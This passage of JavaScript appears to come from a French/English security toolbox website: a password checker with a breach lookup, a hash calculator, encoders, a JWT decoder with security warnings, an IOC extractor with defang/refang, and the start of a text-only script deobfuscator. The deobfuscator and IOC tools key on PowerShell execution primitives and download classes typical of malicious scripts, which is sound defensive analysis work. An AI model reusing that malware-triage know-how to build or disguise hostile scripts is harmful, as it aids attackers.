      bits -= lost * Math.log2(Math.max(pool, 1)) * 0.8;
      notes.push(L("Contient des répétitions (aaa, ababab…).", "Contains repetitions (aaa, ababab…)."));
    }
    // date ou année
    if (/(19|20)\d{2}/.test(pw)) {
      bits -= 6;
      notes.push(L("Contient une année : c'est souvent une date de naissance, facile à deviner.",
        "Contains a year: often a birth date, easy to guess."));
    }
    // modèle « Mot123! » : une majuscule au début, chiffres/symbole à la fin
    if (/^[A-Z][a-z]+[\d]+[\W_]?$/.test(pw)) {
      bits -= 8;
      notes.push(L("Suit le modèle le plus prévisible : majuscule au début, chiffres à la fin.",
        "Follows the most predictable pattern: capital first, digits at the end."));
    }
    if (chars.length < 12) {
      notes.push(L("Moins de 12 caractères : la longueur est le critère qui compte le plus.",
        "Under 12 characters: length is what matters most."));
    }
    var nClasses = ["lower", "upper", "digits", "symbols", "other"].filter(function (k) { return classes[k]; }).length;
    if (nClasses < 3 && chars.length < 16) {
      notes.push(L("Mélange davantage de types de caractères, ou allonge-le (une phrase de passe de 4-5 mots marche très bien).",
        "Mix more character types, or make it longer (a 4–5 word passphrase works very well)."));
    }
    bits = Math.max(0, bits);
    var score = bits < 28 ? 0 : bits < 40 ? 1 : bits < 60 ? 2 : bits < 80 ? 3 : 4;
    return { bits: bits, score: score, notes: notes, length: chars.length, classes: nClasses };
  }

  function initChecker() {
    var input = $("#pc-input"), bar = $("#pc-bar"), verdict = $("#pc-verdict");
    var stats = $("#pc-stats"), notes = $("#pc-notes"), leak = $("#pc-leak"), btn = $("#pc-hibp");
    var LABELS = [
      ["Très faible", "Very weak"], ["Faible", "Weak"], ["Moyen", "Fair"], ["Fort", "Strong"], ["Très fort", "Very strong"]
    ];

    function update() {
      var pw = input.value;
      msg(leak, "", "");
      btn.disabled = !pw;
      if (!pw) {
        bar.style.width = "0";
        verdict.innerHTML = "";
        stats.innerHTML = "";
        msg(notes, "", "");
        return;
      }
      var a = analyse(pw);
      bar.style.width = (20 + a.score * 20) + "%";
      bar.setAttribute("data-score", a.score);
      verdict.innerHTML = "<strong>" + L(LABELS[a.score][0], LABELS[a.score][1]) + "</strong>";
      // attaque hors ligne sur un hash rapide : 10 milliards d'essais/s, temps moyen = moitié de l'espace
      var seconds = Math.pow(2, a.bits - 1) / 1e10;
      stats.innerHTML =
        '<div class="tool-stat"><span class="tool-stat__k">' + L("longueur", "length") + '</span><span class="tool-stat__v">' + a.length + "</span></div>" +
        '<div class="tool-stat"><span class="tool-stat__k">' + L("types de caractères", "character types") + '</span><span class="tool-stat__v">' + a.classes + " / 5</span></div>" +
        '<div class="tool-stat"><span class="tool-stat__k">' + L("entropie estimée", "estimated entropy") + '</span><span class="tool-stat__v">' + Math.round(a.bits) + " bits</span></div>" +
        '<div class="tool-stat"><span class="tool-stat__k">' + L("cassage hors ligne*", "offline cracking*") + '</span><span class="tool-stat__v">' + fmtDuration(seconds) + "</span></div>";
      if (a.notes.length) {
        msg(notes, a.score >= 3 ? "" : "warn",
          L("Points d'attention :", "Things to watch:") + "<ul><li>" + a.notes.join("</li><li>") + "</li></ul>");
      } else {
        msg(notes, "ok", L("Aucun schéma prévisible détecté.", "No predictable pattern detected."));
      }
    }

    function checkLeak() {
      var pw = input.value;
      if (!pw) return;
      btn.disabled = true;
      msg(leak, "", L("Vérification en cours…", "Checking…"));
      sha("SHA-1", enc.encode(pw)).then(function (hex) {
        hex = hex.toUpperCase();
        var prefix = hex.slice(0, 5), suffix = hex.slice(5);
        return fetch("https://api.pwnedpasswords.com/range/" + prefix).then(function (r) {
          if (!r.ok) throw new Error("HTTP " + r.status);
          return r.text();
        }).then(function (body) {
          var found = 0;
          body.split("\n").some(function (line) {
            var p = line.trim().split(":");
            if (p[0] === suffix) { found = parseInt(p[1], 10) || 0; return true; }
            return false;
          });
          if (input.value !== pw) return; // le champ a changé pendant la requête
          if (found) {
            var nf = function (l) { return found.toLocaleString(LOCALES[l]); };
            msg(leak, "bad", L5("<strong>Ce mot de passe apparaît " + nf("fr") +
              " fois dans des fuites de données.</strong> Ne l'utilise plus nulle part.",
              "<strong>This password appears " + nf("en") +
              " times in data breaches.</strong> Stop using it everywhere.",
              "<strong>Esta contraseña aparece " + nf("es") + " veces en filtraciones de datos.</strong> No la uses más en ningún sitio.",
              "<strong>Esta palavra-passe aparece " + nf("pt") + " vezes em fugas de dados.</strong> Não a uses mais em lado nenhum.",
              "<strong>Dieses Passwort taucht " + nf("de") + "-mal in Datenlecks auf.</strong> Verwende es nirgends mehr."));
          } else {
            msg(leak, "ok", L("Absent des fuites connues de Have I Been Pwned. Ça ne garantit pas qu'il soit robuste : regarde aussi l'analyse ci-dessus.",
              "Not found in Have I Been Pwned's known breaches. That doesn't make it strong: check the analysis above too."));
          }
        });
      }).catch(function () {
        msg(leak, "warn", L("Impossible de joindre le service de vérification. Réessaie plus tard.",
          "Could not reach the breach-check service. Try again later."));
      }).then(function () { btn.disabled = !input.value; });
    }

    input.addEventListener("input", debounce(update, 120));
    btn.addEventListener("click", checkLeak);
    $("#pc-show").addEventListener("change", function (e) {
      input.type = e.target.checked ? "text" : "password";
    });
    update();
  }

  /* ---------- Calculateur de hash ---------- */
  var ALGOS = [["MD5", null], ["SHA-1", "SHA-1"], ["SHA-256", "SHA-256"], ["SHA-384", "SHA-384"], ["SHA-512", "SHA-512"]];
  var MAX_FILE = 512 * 1024 * 1024;

  function initHash() {
    var text = $("#hh-text"), file = $("#hh-file"), list = $("#hh-list"), cmp = $("#hh-compare");
    var status = $("#hh-status"), upper = $("#hh-upper"), fileInfo = $("#hh-fileinfo");
    var outs = {}, run = 0, mode = "text";

    ALGOS.forEach(function (a) {
      var name = document.createElement("span");
      name.className = "hash-name";
      name.textContent = a[0];
      var out = document.createElement("div");
      out.className = "tool-output";
      outs[a[0]] = out;
      list.appendChild(name);
      list.appendChild(out);
      list.appendChild(makeCopy(function () { return out.textContent; }));
    });

    function compare() {
      var want = cmp.value.trim().toLowerCase();
      var hit = null;
      ALGOS.forEach(function (a) {
        var o = outs[a[0]], ok = want && o.textContent.toLowerCase() === want;
        o.classList.toggle("hash-ok", !!ok);
        if (ok) hit = a[0];
      });
      if (!want) msg(status, "", "");
      else if (hit) msg(status, "ok", L5("Correspondance : " + hit + ".", "Match: " + hit + ".", "Coincidencia: " + hit + ".", "Correspondência: " + hit + ".", "Treffer: " + hit + "."));
      else msg(status, "bad", L("Aucune correspondance avec les empreintes ci-dessus.", "No match with the hashes above."));
    }
    function show(bytes) {
      var id = ++run;
      var res = { MD5: md5(bytes) };
      return Promise.all(ALGOS.slice(1).map(function (a) {
        return sha(a[1], bytes).then(function (h) { res[a[0]] = h; });
      })).then(function () {
        if (id !== run) return;
        ALGOS.forEach(function (a) {
          outs[a[0]].textContent = upper.checked ? res[a[0]].toUpperCase() : res[a[0]];
        });
        compare();
      });
    }
    function fromText() { mode = "text"; fileInfo.textContent = ""; show(enc.encode(text.value)); }
    function fromFile() {
      var f = file.files && file.files[0];
      if (!f) return;
      if (f.size > MAX_FILE) {
        msg(status, "warn", L("Fichier trop volumineux (512 Mo maximum dans le navigateur).",
          "File too large (512 MB max in the browser)."));
        return;
      }
      mode = "file";
      fileInfo.textContent = f.name + " · " + (f.size / 1024).toFixed(1) + " KiB";
      msg(status, "", L("Calcul en cours…", "Hashing…"));
      f.arrayBuffer().then(function (buf) { return show(new Uint8Array(buf)); });
    }

    text.addEventListener("input", debounce(fromText, 150));
    file.addEventListener("change", fromFile);
    cmp.addEventListener("input", compare);
    upper.addEventListener("change", function () { mode === "file" ? fromFile() : fromText(); });
    fromText();
  }

  /* ---------- Encodeur / décodeur ---------- */
  function b64encode(bytes) {
    var bin = "";
    for (var i = 0; i < bytes.length; i += 0x8000) bin += String.fromCharCode.apply(null, bytes.subarray(i, i + 0x8000));
    return btoa(bin);
  }
  function b64decode(str) {
    var s = str.replace(/\s+/g, "").replace(/-/g, "+").replace(/_/g, "/");
    if (s.length % 4 === 1) throw new Error("length");
    while (s.length % 4) s += "=";
    var bin = atob(s), out = new Uint8Array(bin.length);
    for (var i = 0; i < bin.length; i++) out[i] = bin.charCodeAt(i);
    return out;
  }
  function bytesToText(bytes) {
    try {
      return { text: new TextDecoder("utf-8", { fatal: true }).decode(bytes), binary: false };
    } catch (e) {
      return { text: toHex(bytes).replace(/(..)(?!$)/g, "$1 "), binary: true };
    }
  }
  var CODECS = {
    base64: {
      enc: function (s) { return b64encode(enc.encode(s)); },
      dec: function (s) { return bytesToText(b64decode(s)); }
    },
    base64url: {
      enc: function (s) { return b64encode(enc.encode(s)).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, ""); },
      dec: function (s) { return bytesToText(b64decode(s)); }
    },
    url: {
      enc: function (s) { return encodeURIComponent(s); },
      dec: function (s) { return { text: decodeURIComponent(s.replace(/\+/g, " ")), binary: false }; }
    },
    hex: {
      enc: function (s) { return toHex(enc.encode(s)); },
      dec: function (s) {
        var h = s.replace(/0x/gi, "").replace(/[\s:,\\x-]/g, "");
        if (!/^[0-9a-f]*$/i.test(h) || h.length % 2) throw new Error("hex");
        var out = new Uint8Array(h.length / 2);
        for (var i = 0; i < out.length; i++) out[i] = parseInt(h.substr(i * 2, 2), 16);
        return bytesToText(out);
      }
    },
    html: {
      enc: function (s) { return esc(s); },
      dec: function (s) {
        var d = new DOMParser().parseFromString("<!doctype html><body>" + s.replace(/</g, "&lt;"), "text/html");
        return { text: d.body.textContent, binary: false };
      }
    }
  };

  function initEncoder() {
    var input = $("#ed-input"), output = $("#ed-output"), fmt = $("#ed-format"), status = $("#ed-status");
    function go(dir) {
      msg(status, "", "");
      try {
        var c = CODECS[fmt.value];
        if (dir === "enc") {
          output.value = c.enc(input.value);
        } else {
          var r = c.dec(input.value.trim());
          output.value = r.text;
          if (r.binary) msg(status, "warn", L("Le résultat n'est pas du texte : il est affiché en hexadécimal.",
            "The result isn't text, so it's shown as hexadecimal."));
        }
      } catch (e) {
        output.value = "";
        msg(status, "bad", L("Entrée invalide pour ce format.", "Invalid input for this format."));
      }
    }
    $("#ed-encode").addEventListener("click", function () { go("enc"); });
    $("#ed-decode").addEventListener("click", function () { go("dec"); });
    $("#ed-swap").addEventListener("click", function () {
      input.value = output.value;
      output.value = "";
      msg(status, "", "");
    });
  }

  /* ---------- Décodeur JWT ---------- */
  function initJwt() {
    var input = $("#jw-input"), status = $("#jw-status"), head = $("#jw-header"), body = $("#jw-payload");
    var claims = $("#jw-claims"), warn = $("#jw-warn");
    var NAMES = {
      iss: ["émetteur", "issuer"], sub: ["sujet", "subject"], aud: ["audience", "audience"],
      iat: ["émis le", "issued at"], nbf: ["valide à partir du", "not before"], exp: ["expire le", "expires"],
      jti: ["identifiant", "token id"]
    };
    function date(v) {
      var d = new Date(v * 1000);
      return isNaN(d) ? esc(v) : LF(function (l) { return esc(d.toLocaleString(l === "en" ? "en-GB" : LOCALES[l])); }) + " <small>(" + esc(v) + ")</small>";
    }
    function json(part) {
      var r = bytesToText(b64decode(part));
      if (r.binary) throw new Error("binary");
      return JSON.parse(r.text);
    }
    function clear() {
      head.textContent = ""; body.textContent = ""; claims.innerHTML = ""; msg(warn, "", "");
    }
    function update() {
      var tok = input.value.trim().replace(/^bearer\s+/i, "");
      clear();
      if (!tok) { msg(status, "", ""); return; }
      var parts = tok.split(".");
      if (parts.length === 5) {
        msg(status, "warn", L("C'est un JWE (jeton chiffré) : son contenu ne peut pas être lu sans la clé.",
          "This is a JWE (encrypted token): its content can't be read without the key."));
        try { head.textContent = JSON.stringify(json(parts[0]), null, 2); } catch (e) {}
        return;
      }
      if (parts.length !== 3) {
        msg(status, "bad", L("Format invalide : un JWT contient trois parties séparées par des points.",
          "Invalid format: a JWT has three parts separated by dots."));
        return;
      }
      var h, p;
      try { h = json(parts[0]); p = json(parts[1]); } catch (e) {
        msg(status, "bad", L("Impossible de décoder l'en-tête ou le contenu (Base64URL ou JSON invalide).",
          "Could not decode the header or payload (invalid Base64URL or JSON)."));
        return;
      }
      head.textContent = JSON.stringify(h, null, 2);
      body.textContent = JSON.stringify(p, null, 2);

      var now = Date.now() / 1000, rows = [];
      if (h.alg) rows.push([L("algorithme", "algorithm"), esc(h.alg)]);
      Object.keys(NAMES).forEach(function (k) {
        if (p[k] === undefined) return;
        var v = /^(iat|nbf|exp)$/.test(k) && typeof p[k] === "number" ? date(p[k]) : esc(Array.isArray(p[k]) ? p[k].join(", ") : p[k]);
        rows.push([L(NAMES[k][0], NAMES[k][1]) + " <small>(" + k + ")</small>", v]);
      });
      claims.innerHTML = rows.map(function (r) {
        return '<div class="tool-stat"><span class="tool-stat__k">' + r[0] + '</span><span class="tool-stat__v">' + r[1] + "</span></div>";
      }).join("");

      if (typeof p.exp === "number" && p.exp < now) {
        msg(status, "bad", L("Jeton <strong>expiré</strong>.", "Token <strong>expired</strong>."));
      } else if (typeof p.nbf === "number" && p.nbf > now) {
        msg(status, "warn", L("Jeton <strong>pas encore valide</strong> (nbf dans le futur).", "Token <strong>not valid yet</strong> (nbf in the future)."));
      } else if (typeof p.exp === "number") {
        msg(status, "ok", L("Jeton dans sa période de validité.", "Token within its validity period."));
      } else {
        msg(status, "warn", L("Aucune date d'expiration (exp) : ce jeton reste valable indéfiniment.", "No expiry (exp): this token never expires."));
      }

      var w = [];
      var alg = String(h.alg || "").toLowerCase();
      if (!alg || alg === "none") {
        w.push(L("<strong>alg: none</strong> : jeton non signé. Un serveur qui l'accepte peut être contourné.",
          "<strong>alg: none</strong>: unsigned token. A server that accepts it can be bypassed."));
      } else if (/^hs/.test(alg)) {
        w.push(L("Signature HMAC à secret partagé : sa robustesse dépend entièrement de la longueur du secret.",
          "Shared-secret HMAC signature: its strength depends entirely on the secret's length."));
      }
      if (h.jku || h.x5u) w.push(L("L'en-tête pointe vers une clé distante (jku/x5u) : le serveur doit restreindre les URL acceptées.",
        "The header points to a remote key (jku/x5u): the server must restrict accepted URLs."));
      if (h.kid && /[\/\\.'";]/.test(String(h.kid))) w.push(L("Le kid contient des caractères inhabituels : vérifie qu'il n'est pas utilisé tel quel dans un chemin ou une requête.",
        "The kid contains unusual characters: make sure it isn't used as-is in a path or query."));
      if (/(passw|secret|pwd|card|iban)/i.test(JSON.stringify(p))) w.push(L("Le contenu semble contenir une donnée sensible : un JWT signé n'est pas chiffré, tout le monde peut le lire.",
        "The payload seems to hold sensitive data: a signed JWT isn't encrypted, anyone can read it."));
      w.push(L("La signature n'est pas vérifiée ici : décoder un jeton ne prouve pas qu'il est authentique.",
        "The signature isn't verified here: decoding a token doesn't prove it's genuine."));
      msg(warn, "warn", "<ul><li>" + w.join("</li><li>") + "</li></ul>");
    }
    input.addEventListener("input", debounce(update, 120));
    update();
  }

  /* ---------- IOC : extraction, defang, refang ---------- */
  var FILE_EXT = ("exe dll sys bat cmd ps1 psm1 vbs js jse wsf hta lnk msi scr cpl jar py sh pl rb php asp aspx jsp " +
    "txt log csv json xml yml yaml ini cfg conf dat tmp bak html htm css md doc docx xls xlsx xlsm ppt pptx pdf rtf " +
    "png jpg jpeg gif bmp svg ico zip rar 7z gz tar tgz iso img vhd bin elf so dylib apk ipa dmg pkg mov mp4 mp3 avi wav").split(" ");
  /* Sécurité (ReDoS) : aucune expression ci-dessous ne contient de groupe répété suivi d'une condition
     qui peut échouer. Les domaines et les emails ne sont plus détectés par regex mais en deux temps :
     découpage linéaire en morceaux de caractères autorisés, puis validation en JavaScript. Avant ce
     correctif, un texte de 2 Mo comme « aaaa….aaaa…. » bloquait l'onglet plusieurs minutes. */
  var RE = {
    url: /\b(?:https?|ftp):\/\/[^\s"'<>()\[\]{}]+/gi,
    ipv4: /\b(?:(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\.){3}(?:25[0-5]|2[0-4]\d|1\d\d|[1-9]?\d)\b/g,
    sha256: /\b[a-f0-9]{64}\b/gi,
    sha1: /\b[a-f0-9]{40}\b/gi,
    md5: /\b[a-f0-9]{32}\b/gi,
    cve: /\bCVE-\d{4}-\d{4,7}\b/gi
  };
  var HOST_PIECE = /[a-z0-9.-]+/gi;                   // morceaux candidats : classe simple, sans retour arrière
  var LABEL = /^[a-z0-9](?:[a-z0-9-]*[a-z0-9])?$/i;   // appliqué seulement à des libellés de 63 caractères max
  var TLD = /^[a-z][a-z0-9-]{1,23}$/i;
  var LOCAL_CHARS = /[a-z0-9._%+-]/i, HOST_CHARS = /[a-z0-9.-]/i;

  function trimUrl(u) {
    var n = u.length;
    while (n > 0 && ".,;:!?'\"".indexOf(u[n - 1]) !== -1) n--;
    return u.slice(0, n);
  }
  // Bornes [début, fin[ du morceau sans ses points et tirets de bord (boucles : une regex ancrée serait quadratique).
  function trimEdges(s) {
    var a = 0, b = s.length;
    while (a < b && (s[a] === "." || s[a] === "-")) a++;
    while (b > a && (s[b - 1] === "." || s[b - 1] === "-")) b--;
    return [a, b];
  }
  function validHost(h) {
    if (h.length < 4 || h.length > 253) return false;
    var labels = h.split(".");
    if (labels.length < 2) return false;
    for (var i = 0; i < labels.length; i++) {
      if (labels[i].length > 63 || !LABEL.test(labels[i])) return false;
    }
    var tld = labels[labels.length - 1].toLowerCase();
    return TLD.test(tld) && FILE_EXT.indexOf(tld) === -1;
  }
  // Positions des emails : pour chaque @, on remonte la partie locale et on avance sur le domaine.
  // Chaque caractère est parcouru au plus deux fois : temps linéaire.
  function findEmails(s) {
    var out = [];
    for (var at = s.indexOf("@"); at !== -1; at = s.indexOf("@", at + 1)) {
      var a = at;
      while (a > 0 && at - a < 64 && LOCAL_CHARS.test(s[a - 1])) a--;
      var b = at + 1;
      while (b < s.length && b - at <= 254 && HOST_CHARS.test(s[b])) b++;
      while (a < at && s[a] === ".") a++;
      var host = s.slice(at + 1, b), e = trimEdges(host);
      if (a < at && e[0] === 0 && validHost(host.slice(0, e[1]))) out.push([a, at + 1 + e[1]]);
    }
    return out;
  }
  function eachHost(s, fn) {
    return s.replace(HOST_PIECE, function (piece) {
      var e = trimEdges(piece), inner = piece.slice(e[0], e[1]);
      return validHost(inner) ? piece.slice(0, e[0]) + fn(inner) + piece.slice(e[1]) : piece;
    });
  }
  function isPrivate(ip) {
    var o = ip.split(".").map(Number);
    return o[0] === 10 || o[0] === 127 || (o[0] === 172 && o[1] >= 16 && o[1] <= 31) ||
      (o[0] === 192 && o[1] === 168) || (o[0] === 169 && o[1] === 254) || o[0] === 0 || o[0] >= 224;
  }
  function refang(s) {
    return s
      .replace(/h(?:xx|\*\*|XX)p(s?)/gi, "http$1")
      .replace(/f(?:xx|XX)p/gi, "ftp")
      .replace(/\[:\/\/\]|\[:\]\/\//g, "://")
      // espaces bornés ({0,2}) : avec \s* une longue suite d'espaces rendait la recherche quadratique
      .replace(/[ \t]{0,2}[\[\(\{][ \t]{0,2}(?:\.|dot)[ \t]{0,2}[\]\)\}][ \t]{0,2}/gi, ".")
      .replace(/[ \t]{0,2}[\[\(\{][ \t]{0,2}(?:@|at)[ \t]{0,2}[\]\)\}][ \t]{0,2}/gi, "@")
      .replace(/\[:\]/g, ":");
  }
  function defangHost(h) { return h.replace(/\./g, "[.]"); }
  function defangUrl(u) {
    var m = u.match(/^([a-z]+):\/\/([^\/?#]*)(.*)$/i);
    if (!m) return u;
    var scheme = m[1].replace(/^http/i, "hxxp").replace(/^ftp/i, "fxp");
    return scheme + "://" + defangHost(m[2]) + m[3];
  }
  function defangEmail(e) { return e.replace("@", "[@]").replace(/\./g, "[.]"); }
  function defang(s) {
    s = s.replace(RE.url, function (u) { var t = trimUrl(u); return defangUrl(t) + u.slice(t.length); });
    var parts = [], last = 0;
    findEmails(s).forEach(function (p) {
      parts.push(s.slice(last, p[0]), defangEmail(s.slice(p[0], p[1])));
      last = p[1];
    });
    parts.push(s.slice(last));
    return eachHost(parts.join("").replace(RE.ipv4, defangHost), defangHost);
  }
  function uniq(arr) {
    var seen = {}, out = [];
    arr.forEach(function (x) { var k = x.toLowerCase(); if (!seen[k]) { seen[k] = 1; out.push(x); } });
    return out;
  }
  // Dans du code, « IO.MemoryStream » ou « Net.WebClient » ressemblent à des domaines : on écarte
  // les racines d'espaces de noms connues et les derniers segments en PascalCase (DeflateStream).
  var CODE_ROOTS = /^(?:system|io|net|text|reflection|microsoft|management|security|diagnostics|runtime|collections|convert|environment|wscript|scripting|adodb|msxml2|shell|window|document|console|string|array|object|math|json)$/i;
  function looksLikeCode(h) {
    var labels = h.split(".");
    return CODE_ROOTS.test(labels[0]) || /^[A-Z][a-z]{2,}(?:[A-Z][a-z]{2,})+$/.test(labels[labels.length - 1]);
  }
  function extract(s, codeAware) {
    var t = refang(s);
    var urls = uniq((t.match(RE.url) || []).map(trimUrl));
    var emails = uniq(findEmails(t).map(function (p) { return t.slice(p[0], p[1]); }));
    var ips = uniq(t.match(RE.ipv4) || []);
    var hosts = [];
    eachHost(t, function (h) {
      if (!(codeAware && looksLikeCode(h))) hosts.push(h.toLowerCase());
      return h;
    });
    var domains = uniq(hosts);
    var sha256 = uniq(t.match(RE.sha256) || []);
    var noSha256 = t.replace(RE.sha256, " ");
    var sha1 = uniq(noSha256.match(RE.sha1) || []);
    var md5s = uniq(noSha256.replace(RE.sha1, " ").match(RE.md5) || []);
    var cves = uniq((t.match(RE.cve) || []).map(function (c) { return c.toUpperCase(); }));
    return [
      ["URL", urls, "url"], [L("Domaines", "Domains"), domains, "domain"], ["IPv4", ips, "ip"],
      ["Emails", emails, "email"], ["SHA-256", sha256], ["SHA-1", sha1], ["MD5", md5s], ["CVE", cves]
    ];
  }

  // Affiche les IOC extraits d'un texte, groupés par type ; renvoie leur nombre.
  // Partagé par l'extracteur d'IOC et le désobfuscateur.
  function renderIocGroups(outBox, source, wantDefang, codeAware) {
    var groups = extract(source, codeAware), total = 0;
    outBox.innerHTML = "";
    groups.forEach(function (g) {
        if (!g[1].length) return;
        total += g[1].length;
        var items = g[1].map(function (v) {
          if (!wantDefang) return v;
          if (g[2] === "url") return defangUrl(v);
          if (g[2] === "email") return v.replace("@", "[@]").replace(/\./g, "[.]");
          if (g[2] === "domain" || g[2] === "ip") return defangHost(v);
          return v;
        });
        var wrap = document.createElement("div");
        wrap.className = "ioc-group";
        var headEl = document.createElement("div");
        headEl.className = "ioc-group__head";
        var label = document.createElement("span");
        label.innerHTML = g[0] + " (" + g[1].length + ")";
        headEl.appendChild(label);
        var text = items.join("\n");
        headEl.appendChild(makeCopy(function () { return text; }));
        var pre = document.createElement("pre");
        pre.className = "tool-output";
        if (g[2] === "ip") {
          pre.innerHTML = g[1].map(function (ip, i) {
            return esc(items[i]) + (isPrivate(ip) ? '  <small class="tool-muted">' + L("(privée/réservée)", "(private/reserved)") + "</small>" : "");
          }).join("\n");
        } else {
          pre.textContent = text;
        }
        wrap.appendChild(headEl);
        wrap.appendChild(pre);
        outBox.appendChild(wrap);
    });
    return total;
  }

  function initIoc() {
    var input = $("#io-input"), outBox = $("#io-results"), status = $("#io-status");
    var defOut = $("#io-defang-out"), outText = $("#io-text");

    function renderExtract() {
      outText.parentNode.hidden = true;
      var total = renderIocGroups(outBox, input.value, defOut.checked);
      if (!input.value.trim()) msg(status, "", "");
      else if (total) msg(status, "ok", L5(total + " indicateur(s) trouvé(s), doublons retirés.", total + " indicator(s) found, duplicates removed.",
        total + " indicador(es) encontrado(s), duplicados eliminados.", total + " indicador(es) encontrado(s), duplicados removidos.",
        total + " Indikator(en) gefunden, Duplikate entfernt."));
      else msg(status, "warn", L("Aucun indicateur trouvé.", "No indicators found."));
    }
    function renderText(fn) {
      outBox.innerHTML = "";
      msg(status, "", "");
      outText.textContent = fn(input.value);
      outText.parentNode.hidden = false;
    }
    $("#io-extract").addEventListener("click", renderExtract);
    $("#io-defang").addEventListener("click", function () { renderText(defang); });
    $("#io-refang").addEventListener("click", function () { renderText(refang); });
    defOut.addEventListener("change", function () { if (outBox.children.length) renderExtract(); });
    $("#io-text-copy").appendChild(makeCopy(function () { return outText.textContent; }));
  }

  /* ---------- Désobfuscateur de scripts ---------- */
  // Principe : uniquement des TRANSFORMATIONS DE TEXTE, appliquées en boucle jusqu'à ce que plus
  // rien ne change (chaque passage retire une « couche »). Le script n'est jamais exécuté :
  // aucun eval ni new Function ici, et la CSP du site les interdit de toute façon.
  // Sécurité du moteur : expressions régulières sans retour arrière catastrophique (blancs
  // bornés, alternatives disjointes), taille d'entrée et de sortie plafonnées (bombes de
  // décompression), résultats affichés uniquement via textContent.

  var DEOB_MAX_INPUT = 2 * 1024 * 1024, DEOB_MAX_OUTPUT = 8 * 1024 * 1024, DEOB_MAX_STEPS = 80;
  // 'texte' ('' = apostrophe). Les gardes (?<!') et (?!') lèvent l'ambiguïté entre « fin de
  // chaîne » et « apostrophe doublée » : sans elles, une longue suite d'apostrophes coûtait un
  // temps quadratique (déni de service trouvé en test).
  var PS_SQ = "(?<!')'(?:[^']|'')*'(?!')";
  var PS_DQ = '"(?:[^"`]|`[\\s\\S])*"';                 // "texte" (` = échappement)
  var PS_LIT = "(?:" + PS_SQ + "|" + PS_DQ + ")";
  var JS_SQ = "'(?:[^'\\\\\\n]|\\\\[\\s\\S])*'";        // 'texte' (\ = échappement)
  var JS_DQ = '"(?:[^"\\\\\\n]|\\\\[\\s\\S])*"';
  var JS_LIT = "(?:" + JS_SQ + "|" + JS_DQ + ")";
  var SP = "[ \\t\\r\\n]{0,20}";
  var NUM = "(?:0x[0-9a-fA-F]{1,6}|\\d{1,7})";
  var NUMLIST = NUM + "(?:" + SP + "," + SP + NUM + "){0,100000}";

  function psValue(lit) {
    var s = lit.slice(1, -1);
    if (lit[0] === "'") return s.replace(/''/g, "'");
    var map = { "0": "\0", a: "\x07", b: "\b", e: "\x1b", f: "\f", n: "\n", r: "\r", t: "\t", v: "\v" };
    return s.replace(/`([\s\S])/g, function (m, c) {
      return Object.prototype.hasOwnProperty.call(map, c) ? map[c] : c;
    });
  }
  function psQuote(v) { return "'" + v.replace(/'/g, "''") + "'"; }
  function jsValue(lit) {
    return lit.slice(1, -1).replace(/\\(?:x([0-9a-fA-F]{2})|u\{([0-9a-fA-F]{1,6})\}|u([0-9a-fA-F]{4})|([0-7]{1,3})|([\s\S]))/g,
      function (m, x, ub, u, oct, c) {
        if (x) return String.fromCharCode(parseInt(x, 16));
        if (ub) { var cp = parseInt(ub, 16); return cp <= 0x10ffff ? String.fromCodePoint(cp) : ""; }
        if (u) return String.fromCharCode(parseInt(u, 16));
        if (oct) return String.fromCharCode(parseInt(oct, 8) & 0xff);
        var map = { n: "\n", r: "\r", t: "\t", b: "\b", f: "\f", v: "\v" };
        return Object.prototype.hasOwnProperty.call(map, c) ? map[c] : c;
      });
  }
  function jsQuote(v) {
    return "'" + v.replace(/[\\'\x00-\x1f\x7f]/g, function (c) {
      if (c === "\\") return "\\\\";
      if (c === "'") return "\\'";
      if (c === "\n") return "\\n";
      if (c === "\r") return "\\r";
      if (c === "\t") return "\\t";
      var h = c.charCodeAt(0).toString(16);
      return "\\x" + (h.length < 2 ? "0" : "") + h;
    }) + "'";
  }
  function codeToChar(n) { return n >= 0 && n <= 0x10ffff ? String.fromCodePoint(n) : ""; }
  function parseNum(s) { return /^0x/i.test(s) ? parseInt(s, 16) : parseInt(s, 10); }
  function numsToString(list) {
    return list.split(",").map(function (x) { return codeToChar(parseNum(x.trim())); }).join("");
  }
  function escapeRegex(s) { return s.replace(/[.*+?^${}()|[\]\\]/g, "\\$&"); }

  // PowerShell ou JavaScript ? Décide quelle syntaxe de chaînes appliquer à ce passage.
  function detectLang(t) {
    var sample = t.length > 200000 ? t.slice(0, 200000) : t;
    var ps = (sample.match(/\$[A-Za-z_]\w*|\[char\]|-join\b|::|\bIEX\b|Invoke-|\s-f\s|powershell|New-Object|`/gi) || []).length;
    var js = (sample.match(/\bvar\s|\blet\s|\bconst\s|\bfunction\b|fromCharCode|atob\(|eval\(|=>|ActiveXObject|WScript|document\./g) || []).length;
    return js > ps ? "js" : "ps";
  }

  function printableRatio(s) {
    var n = Math.min(s.length, 4000), ok = 0;
    if (!n) return 0;
    for (var i = 0; i < n; i++) {
      var c = s.charCodeAt(i);
      if ((c >= 0x20 && c !== 0x7f && c !== 0xfffd) || c === 9 || c === 10 || c === 13) ok++;
    }
    return ok / n;
  }
  // Octets → texte : UTF-16LE (PowerShell -EncodedCommand, Encoding.Unicode) si un octet sur
  // deux est nul, sinon UTF-8.
  function bytesToScript(bytes, forced) {
    var enc = forced;
    if (!enc) {
      var n = Math.min(bytes.length, 4000), zeros = 0;
      for (var i = 1; i < n; i += 2) if (bytes[i] === 0) zeros++;
      enc = n > 1 && zeros / Math.floor(n / 2) > 0.3 ? "utf-16le" : "utf-8";
    }
    var text = new TextDecoder(enc).decode(bytes);
    return { text: text, enc: enc, ok: text.length > 0 && printableRatio(text) >= 0.9 };
  }
  function looksCompressed(b) {
    return (b[0] === 0x1f && b[1] === 0x8b) || (b[0] === 0x78 && (b[0] * 256 + b[1]) % 31 === 0);
  }
  // Décompression native du navigateur, interrompue au-delà de DEOB_MAX_OUTPUT (bombes).
  function decompress(bytes, format) {
    if (typeof DecompressionStream === "undefined") return Promise.reject(new Error("unsupported"));
    var ds = new DecompressionStream(format), writer = ds.writable.getWriter();
    writer.write(bytes).catch(function () {});
    writer.close().catch(function () {});
    var reader = ds.readable.getReader(), chunks = [], total = 0;
    function pump() {
      return reader.read().then(function (r) {
        if (r.done) {
          var out = new Uint8Array(total), o = 0;
          chunks.forEach(function (c) { out.set(c, o); o += c.length; });
          return out;
        }
        total += r.value.length;
        if (total > DEOB_MAX_OUTPUT) { reader.cancel().catch(function () {}); throw new Error("bomb"); }
        chunks.push(r.value);
        return pump();
      });
    }
    return pump();
  }
  function tryDecompress(bytes) {
